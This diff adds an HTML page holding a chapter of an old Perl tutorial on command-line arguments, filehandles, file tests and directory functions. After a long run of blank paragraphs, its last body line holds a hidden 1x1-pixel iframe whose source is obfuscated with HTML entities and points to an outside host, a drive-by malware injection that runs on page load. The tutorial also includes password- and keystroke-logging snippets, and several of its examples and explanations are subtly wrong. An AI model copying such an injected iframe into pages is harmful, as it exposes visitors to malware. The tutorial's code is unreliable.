@@ -1,0 +1,511 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
+<META NAME="Generator" CONTENT="Microsoft Word 97">
+<TITLE>Ankit Fadia ankit@bol.net.in</TITLE>
+</HEAD>
+<BODY LINK="#0000ff">
+
+<FONT SIZE=2><P>_______________________________________________________________</P>
+
+<P>The Perl Almost Weekly Manual By Ankit Fadia </FONT><A HREF="mailto:ankit@bol.net.in"><FONT SIZE=2>ankit@bol.net.in</FONT></A></P>
+<FONT SIZE=2><P>_______________________________________________________________</P>
+
+<B><P>@ARGV</P>
+
+</B><P>Till now we have learnt about only one special Variable, the $_ variable. Another useful variable is the @ARGV variable which contains a set of elements of all command line arguments provided to the Perl Program. The first command line argument can be found at $ARGV[0], the second at $ARGV[1] and so on. Let's suppose a Perl Program was called using three command line arguments, which are</P>
+<P> Ankit, Fadia, Anki123. Then @ARGV would contain Ankit, Fadia and Anki123, with $ARGV[0]=Ankit, $ARGV[1]= Fadia and $ARGV[2]= Anki123.</P>
+<P>For Example,</P>
+
+<P>The following PERL program takes the number which was passed as a command line argument, then multiplies this argument with 4 and finally displays the result on the screen.</P>
+
+<P>$number = $ARGV[0];</P>
+<P>print $number *4;</P>
+
+<P>Output:</P>
+
+<P>C:\perl&gt;perl filename.pl 5</P>
+<P>20</P>
+
+<P>Not all functions assume $_ to be the default variable, some functions take @ARGV instead. For Example, the shift( ) function. What the shift( ) function does is remove and return the leftmost or the first argument of @ARGV. To understand the use of the shift( ) function, consider the following example.</P>
+
+<P>In this PERL program ,we assume that the User Passes two arguments, the Program then takes the two arguments adds them and then displays the sum on the screen. </P>
+
+<P>$first = shift;</P>
+<P>$second = shift;</P>
+<P>print $first + $second;</P>
+
+<P>Output:</P>
+
+<P>C:\perl&gt;perl filename.pl 3 5</P>
+<P>8</P>
+
+<B><P>Input Output</P>
+</B>
+<P>Until Now we know of only two kinds of data types-: Scalars and Arrays. Well in this chapter, we will learn about a new third kind of data type called Filehandles. These filehandles act as a bridge between the Perl Program and other files, directories or other programs.</P>
+
+<P>In fact, we have already come across file handles in the earlier chapters, without even noticing it. Remember that we used the angle brackets &lt; &gt;, for two purposes: to read files and to get User Input. Now in both the cases, the angle brackets automatically without you knowing of it, opened a filehandle.</P>
+<P>The Standard Perl filehandles are-:</P>
+
+<P>&nbsp;</P>
+<P>STDIN&#9;&#9;Standard Input&#9;&#9;Used to Get User Input</P>
+<P>STDOUT             Standard Output&#9;&#9;The Program output, which is usually displayed on the screen.</P>
+<P>STDERR             Standard Error&#9;&#9;Error Messages to be displayed on the Screen</P>
+
+<P>Just like STDIN is used to get User Input and  ARGV is used to read command line data. All this might seem a bit confusing, but believe me, it really is not. Read on to understand better.</P>
+
+<P>Say you give a command like:</P>
+
+<P>$varname= &lt; &gt;;</P>
+
+<P>then PERL automatically fills the angle brackets with either STDIN or ARGV. But how does PERL decide which handle should be inserted? Good Question. You see, whenever PERL comes across angle brackets, it checks to see whether there is still data left to be read from the command line files. If there is data left, then the angle brackets behaves as &lt;ARGV&gt; else they behave as &lt;STDIN&gt;.</P>
+
+<P>We can also manually differentiate between the two by mentioning either one of them within the angle brackets. So basically we can say that the code &lt;FILE&gt; will read data from FILE.</P>
+
+<B><P>Opening Files For Reading</P>
+</B>
+<P>Well now that you know what file handles do, lets learn how to open a text file to read it's data and print this read data on the screen. The following code does just that-:</P>
+
+<P>open(SITES, "sitelist.txt");  # Open sitelist.txt and name the connection SITES</P>
+<P>while (&lt;SITES&gt;) {</P>
+<P>print;                        # Read the next line from SITES and print it on the screen</P>
+<P>}</P>
+
+<P>Now let's analyze each line of the code snippet. In the first line, we use the open ( ) function (discussed in detail later) to open the file sitelist.txt and give the connection a friendly name of our choice, in this case we name the connection SITES. We can give it any name of our choice, even something like your own name or simply 'a'.</P>
+<P>The second line is the same as </P>
+
+<P>while($_= &lt;SITES&gt;);</P>
+<P><BR>
+We are simply making better, more efficient scripts. It basically reads the next line of sitelist.txt using the opened connection, SITES. This line is then assigned to the default variable $_ , which is finally printed by the third line. Perl reads one by one each line of the file opened.</P>
+
+<P>Now let's say if the file sitelist.txt does not exist, then normally PERL displays a cryptic difficult to understand error message which is of no use to a novice to deduce what went wrong. How can we display our own customised error messages instead of using the cryptic PERL error messages? Well the die ( ) function holds the key.</P>
+
+<P>The basic syntax of the command is-:</P>
+
+<P>&nbsp;</P>
+<P>die(STRING): This code exits the program with the current value of the special variable $! (Discussed Later) and prints STRING on the screen.</P>
+
+<P>Now let's take an example to see how we can use the die( ) function effectively.</P>
+<P>Consider the following snippet of code-:</P>
+
+<P>open (FILE123, "first.txt") | |  die "File Not Found";</P>
+<P>while (&lt;FILE123&gt;) {</P>
+<P>print;</P>
+<P>}</P>
+
+<P>The above program attempts to open the first.txt text file and if it cannot do so for some reason, it displays the cutomised error message, File Not Found on the screen.</P>
+
+<P>Another Special Variable: $!</P>
+
+<P>Earlier I had mentioned a new kind of special variable, the $! Variable. </P>
+
+<P>The $! Or $ERRORNO or $OS_ERROR Variable contains the system error code. In Numeric context ($!) it contains the error number and in character context ($ERRORNO or $OS_ERROR) it contains the error message.</P>
+
+<P>For Example,</P>
+
+<P>print $!;   #Prints current Error Number</P>
+<P>print $ERRORNO;  #Prints Error Message associated with the current Error Number</P>
+
+<P>The Error Number to Error Message table is as follows:</P>
+
+<P>&nbsp;</P>
+<OL>
+
+<LI>Not Owner</LI>
+<LI>No Such File or Directory</LI></OL>
+
+<OL START=5>
+
+<LI>                      Input/Output Error</LI></OL>
+
+<OL START=13>
+
+<LI>                      Permission Denied</LI></OL>
+
+<OL START=17>
+
+<LI>                      File Exits</LI></OL>
+
+<OL START=28>
+
+<LI>                      No Space Left on Drive</LI></OL>
+
+
+<P>This variable is normally is used in the following context;</P>
+
+<P>Open(FILE123, "xyz.doc") || die "File Not Found: $!"</P>
+
+<P>Will display something like the following error message if the file xyz.doc does not exist:</P>
+
+<P>File Not Found: 2</P>
+
+<P>Sometimes, when an error occurs, instead of exiting entirely from the program we might need to display only a Warning Message advising the user what to do next as an error has occurred. This is where the warn ( ) function comes in. This function too works like the die ( ) function the only difference being that the program is not exited.</P>
+<P>For Example,</P>
+
+<P>warn("Caution!! System Resource Low. Please Close some programs before continuing");</P>
+
+<P>&nbsp;</P>
+<P>Till now we have learnt only how to read from a file, now let’s learn how to write or even append to a file. Again we make use of the lovely function open( ). Its basic syntax is as follows-:</P>
+
+<P>open(FILEHANDLE, FILENAME): Opens the file FILENAME and gives the connection the name, FILEHANDLE.</P>
+
+<P>If the open ( ) function is successful it return the TRUE value else it return UNDEF.</P>
+
+<P>Whether a file has been opened for only reading, only writing, appending, or both writing and reading depends on the character at the beginning or preceding FILENAME.</P>
+
+<P>If  FILENAME begins with &lt; (or nothing) the file is opened for Reading only.</P>
+<P>If  FILENAME begins with &gt; then the file is opened for Writing only.</P>
+<P>If  FILENAME begins with &gt;&gt; then the file is opened for appending.</P>
+<P>If  FILENAME begins with +(i.e. +&gt;, &lt;+ or +&gt;&gt;) then the file is opened for reading and    </P>
+<P>   &#9;&#9;&#9;&#9;&#9;&#9; writing(appending).</P>
+<P>If  FILENAME is  - then STDIN is opened</P>
+<P>If  FILENAME is &gt;- then STDOUT is opened</P>
+
+<P>The following are some Practical examples, that will make you understand the various characters better-:</P>
+
+<P>open(FILE, "&gt;&gt;$filename") or die" File not Found";    #File opened for Appending</P>
+
+<P>open(FILE, "+&lt;$filename") or die" File not Found";    #File opened for both reading and writing.</P>
+
+<P>open(FILE, "+&gt;$filename") or die" File not Found";   #File opened for both reading and writing</P>
+
+<P>open(FILE, "&gt;$filename") or die" File not Found";     #File opened for writing.</P>
+
+<P>NOTE: When you try to open a file with the &gt; character then  PERL checks to see if the file by the specified filename exists or not. If yes then the File is overwritten else a new file by the specified filename is created.</P>
+
+<P>The close( ) function is used to close a file connection using the open ( ) function. The basic syntax of the close( ) function is as follows:</P>
+
+<P>Close(FILEHANDLE);</P>
+
+<P>Examples:</P>
+
+<P>print "USERNAME:";</P>
+<P>chomp ($user= &lt; &gt;);</P>
+<P>print "Password:";</P>
+<P>chomp($pass= &lt; &gt;);</P>
+<P>open(LOGFILE, "&gt;&gt;log.txt") or die " Please Re Login";</P>
+<P>close(LOGFILE);</P>
+
+<P>The above code simply logs or appends the Usernames and Passwords typed by the User to a log file, log.txt and then finally closes the File Handle associated with it.</P>
+
+<P>The following PERL program logs all keystrokes of the User until he types EXIT\n.</P>
+
+<P>While(10) {</P>
+<P>$input = &lt;&gt;;     #Infinite Loop</P>
+<P>last if $input eq "exit\n";         #Exit loop when User types Exit followed by Enter.</P>
+<P>open(FILE, "&gt;&gt;xyz.txt");</P>
+<P>print FILE $input;               # Print data typed by User in the file xyz.txt</P>
+<P>}</P>
+<P>close FILE;</P>
+
+<B><P>MOVING AROUND IN A FILE</P>
+</B>
+<P>Now that we know how to open a file for various purposes, how can we move around within a file and how can we tell where you are?</P>
+
+<P>You see, whenever a file handle is used, it has an associated file pointer. When we open a file, the file pointer by default points to 0. This file pointer changes automatically accordingly as we move or read data from the file using the filehandle. This process is automatic and occurs without any User intervention.</P>
+<P>But sometimes, we manually want to change the position of the file pointer and make it point elsewhere. This is when the seek( ) and tell( ) functions come into the picture.</P>
+
+<B><P>seek( )</P>
+</B>
+<P>Basic Syntax of the seek command is:</P>
+
+<P>seek(FILEHANDLE, STEPS, FROM); :Moves the file pointer of the FILEHANDLE to number of STEPS from FROM.</P>
+
+<P>Note: File Positions are measured in Bytes.</P>
+
+<P>The value of FROM can be 0 for the beginning of the file, 1 for the current position and 2 for the end of the file.</P>
+
+<P>The following example will really make you comfortable using the seek( ) command:</P>
+
+<P>seek(FILE, 0, 0);      # moves to beginning of file</P>
+
+<P>seek(FILE, 157,0);   #moves to 157 bytes from the beginning of the file.</P>
+
+<P>seek(FILE,45,1);      #moves 45 bytes ahead.</P>
+
+<P>seek(FILE, -45,1);   #moves 25 bytes behind.</P>
+
+<P>seek(FILE,200,2);   #moves 200 bytes from the End of File.(EOF)</P>
+
+<P>I hope by know you would probably know the seek( ) command like the back of your hand.</P>
+
+<B><P>tell( )</P>
+</B>
+<P>The tell() command returns the current position of the file pointer.</P>
+<P>For Example, </P>
+<P>         </P>
+<P>print tell(FILE);</P>
+
+<P>prints the current position of the file pointer.</P>
+
+<B><P>Truncating Files</P>
+</B>
+<P>The truncate( ) function is used to truncate or shorten  a file to the specified number of bytes. Its basic syntax is:</P>
+
+<P>truncate(FILE, NUM); :Shortens the FILE to NUM number of bytes.</P>
+
+<P>For Example,</P>
+
+<P>truncate("xyz.txt", 100); #Shortens xyz.txt to 100 bytes.</P>
+
+<P>The same above result can also be achieved by the following lines of code:</P>
+
+<P>open(FILE, "+&lt;xyz.txt);</P>
+<P>truncate(FILE, 100);</P>
+
+<B><P>Deleting Files</P>
+
+</B><P>To delete files, we use the unlink( ) function whose basic syntax is as follows:</P>
+<B>
+</B><P>unlink(FILENAMES); :Deletes File Names </P>
+
+<P>This function returns the number of files successfully deleted.</P>
+<P>For Example,</P>
+
+<P>unlink "log.txt";     #Deletes log.txt</P>
+
+<P>This PERL function can be very useful to delete temporary files from the hard disk and save space. Consider the following PERL program which deletes all .bak, *.~ and *.tmp files are the disk.</P>
+
+<P>$name = shift;</P>
+<P>@old = ($name. '.bak', $name. '.~', $name. '.tmp');</P>
+<P>foreach(@old) {</P>
+<P>Print "Deleting $_";</P>
+<P>}</P>
+<P>unlink @old;</P>
+
+<B><P>FILE TESTS</P>
+
+</B><P>Files come in all sizes, properties and types. PERL has certain file tests which inspect File characteristics and properties.</P>
+
+<P>File tests are very funny looking with a single hyphen followed by a special character.</P>
+<P>The basic format of file tests is as follows-:</P>
+
+<P>-TEST FILE: is true only if FILE satisfies TEST. FILE can be either a filename of a filehandle.</P>
+
+<P>The following is a complete list of file tests and their meanings-:</P>
+
+<P>FILE TEST&#9;&#9;Meaning</P>
+
+<P>-e&#9;&#9;&#9;File Exists</P>
+<P>-f&#9;&#9;&#9;File is a plain text</P>
+<P>-d&#9;&#9;&#9;File is a directory</P>
+<P>-T&#9;&#9;&#9;File is a text file</P>
+<P>-B&#9;&#9;&#9;File is a Binary File</P>
+<P>-r&#9;&#9;&#9;File is readable</P>
+<P>-w&#9;&#9;&#9;File is writable</P>
+<P>-x&#9;&#9;&#9;File is executable</P>
+<P>-s&#9;&#9;&#9;Size of File(Returns Number of Bytes)</P>
+<P>-z&#9;&#9;&#9;File is Empty i.e. is of Zero Bytes</P>
+
+<P>&nbsp;</P>
+<P>Now that you have the complete list of files tests, lets see how to practically make use of them. The following is a collection of examples which will make file tests easier to understand.</P>
+<P>Examples,</P>
+
+<P>if (-d "/etc") {</P>
+<P>print "Directory Exists";  #Prints message if /etc is a directory</P>
+<P>}</P>
+
+<P>The following is an example of a PERL program which checks if a file exists.</P>
+
+<P>$file = shift;</P>
+<P>if(-e $file){</P>
+<P>print "$file Exists. \n";</P>
+<P>}</P>
+
+<P>Every file is either a -T or -B. Perl looks at the beginning of the file. If there are a lot of strange characters, then it is a Binary File else it is a Text File. But empty files satisfy both the -T and -B condition. The following Perl Program checks to see if a file is empty or not.</P>
+
+<P>$file = shift;</P>
+<P>if(-z $file){</P>
+<P>print "$file Exists. \n";</P>
+<P>}</P>
+
+<P>&nbsp;</P>
+<P>The stat( ) function</P>
+
+<P>The file tests that we have learnt till now check only a single specific property of a file, however on the other hand, the stat( ) function returns an array of 13 file statistics.</P>
+<P>The syntax of the stat( ) command is-:</P>
+
+<P>stat(FILE) : It returns a 13 element array containing the vital or important statistics of the FILE. The FILE can either be a FILE or a FILEHANDLE.</P>
+
+<P>The elements of the stat array are-:</P>
+
+<P>Index&#9;&#9;Value</P>
+
+<OL START=0>
+
+<LI>The Device</LI>
+<LI>The File's inode</LI>
+<LI>The File's mode</LI>
+<LI>The Number of Hard Links to the File.</LI>
+<LI>The user ID of the file's owner</LI>
+<LI>The Group ID of the file</LI>
+<LI>The raw device</LI>
+<LI>The size of the file</LI>
+<LI>The last time the file was accessed</LI>
+<LI>The last time the file was modified</LI>
+<LI>The last time the status of the file was changed</LI>
+<LI>The block size of the system</LI>
+<LI>The Number of blocks used by the file</LI></OL>
+
+
+<P>Let's take an example in which we use the stat( ) array to compute the size of a file.</P>
+
+<P>$file = shift;</P>
+<P>$size = (stat($file))[7];   #Returns the eight element of the stat( ) array.</P>
+<P>print "Size is: $size";</P>
+
+<P>&nbsp;</P>
+<P>The same above result can be obtained by using the see( ) and tell( ) functions.</P>
+
+<P>$file = shift;</P>
+<P>open(FILE, "$file");</P>
+<P>seek(FILE,0,2);</P>
+<P>$size = tell(FILE);</P>
+<P>print "Size is: $size";</P>
+
+<P>There is yet another method of finding out the size of a file, using the file tests.</P>
+
+<P>$file = shift;</P>
+<P>$size = (-s $filename);</P>
+<P>print "Size is: $size";</P>
+
+<B><P>Reading Bytes and not Lines</P>
+
+</B><P>Normally when a Perl program opens a file for reading, it reads a line one by one. However sometimes we need to read bytes and not lines. This is when the read( ) function comes into picture.</P>
+<P>The basic syntax of the read( ) command is:</P>
+
+<P>read(FILEHANDLE, VARNAME, BYTES, OFFSET) : Reads BYTES number of bytes starting from OFFSET in FILEHANDLE, placing the result in VARNAME. If OFFSET is not specified, then PERL starts reading from the beginning of the file.</P>
+
+<P>For Example,</P>
+
+<P>open(FILE, "xyz.log") or die "File not found";</P>
+<P>read(FILE, $text, 1000);</P>
+<P>print $text;</P>
+
+<P>The above snippet of code reads the first 1000 bytes of the file xyz.log and places them into the variable $text and finally prints it on the screen.</P>
+<P>The read function can sometimes be less accurate. By that what I mean to say is that sometimes, it reads more bytes than you want it to, due to differences in the Buffer of the system. If this is unacceptable, you should instead use the sysread( ) function, whose basic syntax is as follows:</P>
+
+<P>sysread(FILEHANDLE, VARNAME, BYTES, OFFSET) : Reads BYTES number of bytes starting from OFFSET in FILEHANDLE, placing the result in VARNAME.</P>
+
+<P>This function is almost the same as the read()  function accept the fact that it is more accurate and hence sometimes preferable.</P>
+
+<P>Similarly sometimes you may need to write a certain number of bytes from a scalar to a file. For that PERL has the syswrite( ) function, whose syntax is:</P>
+
+<P>syswrite(FILEHANDLE, VAR, BYTES, OFFSET): writes BYTES number of bytes of data from VAR starting at OFFSET to FILEHANDLE.</P>
+
+<P>Both sysread( ) and syswrite( ) return the number of bytes actually read or UNDEF if an error occurs.</P>
+
+<B><P>The getc( ) function</P>
+</B>
+<P>This functions does what its name suggests, it gets the next character from the filehandle. Its syntax is:</P>
+
+<P>getc(FILEHANDLE): returns the next character from FILEHANDLE.</P>
+
+<P>When the End of File or EOF is reached the value of getc( ) is empty.</P>
+
+<B><P>ACCESSING DIRECTORIES</P>
+
+</B><P>Just as for files you have the open( ) and close( ) functions, for directories, you have the opendir( ) and closedir( ) functions. Their syntax is as follows:</P>
+
+<P>opendir(DIRHANDLE, DIRNAME):opens the directory DIRNAME.</P>
+<P>closedir(DIRHANDLE): closes DIRHANDLE</P>
+
+<P>For Example,</P>
+
+<P>opendir(DIR, "/etc");  #opens the /etc directory</P>
+
+<B><P>The readdir Function</P>
+
+</B><P>This is the most used function associated with directories and it's syntax is:</P>
+
+<P>readdir(DIRHANDLE): returns the next file from DIRHANDLE (in scalar context) or the rest of the files (In ARRAY context). If there are no more files, then it return undef.</P>
+
+<P>The following Perl Program uses the opendir( ), closedir( ) and readdir( ) functions to list all files in a particular directory.</P>
+
+<P>$name = shift;</P>
+<P>opendir(DIR, $name) or die "Directory invalid: $! \n";</P>
+<P>@listoffiles = readdir(DIR);</P>
+<P>closedir(DIR);</P>
+<P>foreach $file (@listoffiles) {</P>
+<P>print "$file\n"; </P>
+<P>}</P>
+
+<P>Output: </P>
+<P>C:\perl&gt; filename.pl /etc</P>
+
+<P>Ankit.log</P>
+<P>Ankit.txt</P>
+<P>Passwd.txt</P>
+
+<B><P>Other Directory Functions</P>
+
+</B><P>The following is a list of syntax and use of some other popular Directory Functions:</P>
+<B>
+</B><P>telldir(DIRHANDLE): returns the position of DIRHANDLE.</P>
+
+<P>seekdir(SIRHANDLE, POSITION): sets DIEHANDLE to read from POSITION which should be </P>
+<P>something like the value returned by telldir( )</P>
+
+<P>rewinddir(DIRHANDLE): sets DIRHANDLE to the top of the directory.</P>
+
+<P>mkdir(DIRNAME, MODE) : Creates Directory with the name DIRNAME and mode specified by MODE(Unix).</P>
+
+<P>rmdir(DIRNAME, MODE): Deletes the directory DIRNAME.</P>
+
+<P>chdir(DIR): changes the working directory to DIR.</P>
+
+<P>chroot(DIR): Changes the root directory for the current process to DIR. Only root is allowed to do this.</P>
+
+<P>&nbsp;</P>
+<P>Well this is the end of the Perl Section. These Perl Manuals were not aimed at making you a Perl guru but to teach you Perl to that extend to which you could write Useful Programs. For further free Perl Manuals join my mailing list by sending an email to: </FONT><A HREF="mailto:programmingforhackers-subscribe@egroups.com"><FONT SIZE=2>programmingforhackers-subscribe@egroups.com</FONT></A><FONT SIZE=2> There I will distribute manuals on both Perl and C which will make you proper experts.</P>
+
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P></FONT><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
